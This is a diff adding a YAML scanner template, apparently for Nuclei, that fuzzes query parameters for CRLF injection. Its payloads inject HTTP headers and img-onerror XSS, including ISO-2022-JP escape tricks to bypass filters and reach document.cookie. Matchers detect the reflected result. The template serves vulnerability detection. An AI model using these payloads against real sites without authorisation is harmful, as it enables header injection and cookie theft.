@@ -1,0 +1,49 @@
+id: crlf-fuzzing-chinese
+
+info:
+  name: CRLF Fuzzing Chinese
+  author: reewardius
+  reference: http://zhchbin.github.io/2016/01/31/CRLF-Injection-and-Bypass-WAF/
+  severity: medium
+  tags: blind,fuzzing,crlf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+      - "a%0D%0AContent-Length:120%0D%0AX-XSS-Protection:0%0D%0AContent-Type:text/html;%20charset=ISO-2022-JP%0D%0A%0D%0A%3Cimg%20src=x%20on%1B%28Jerror=%22al%1B%28Jert%28document.co%1B%28Jokie%29%22%3E"
+      - "a%0D%0AContent-Length:120%0D%0AContent-Type:text/html;%20charset=ISO-2022-JP%0D%0A%0D%0A%3Cimg%20src=x%20on%1B%28Jerror=al%1B%28Jert%28document.domain%29%3E"
+      - "a%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E"
+      - "%00a%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body 
+        words:
+          - "img src=x onerror=alert(document.cookie)"
+          - "img src=x onerror=alert(document.domain)"
+          - "img src=1 onerror=alert(1)"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
+          - 500
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "text/html"
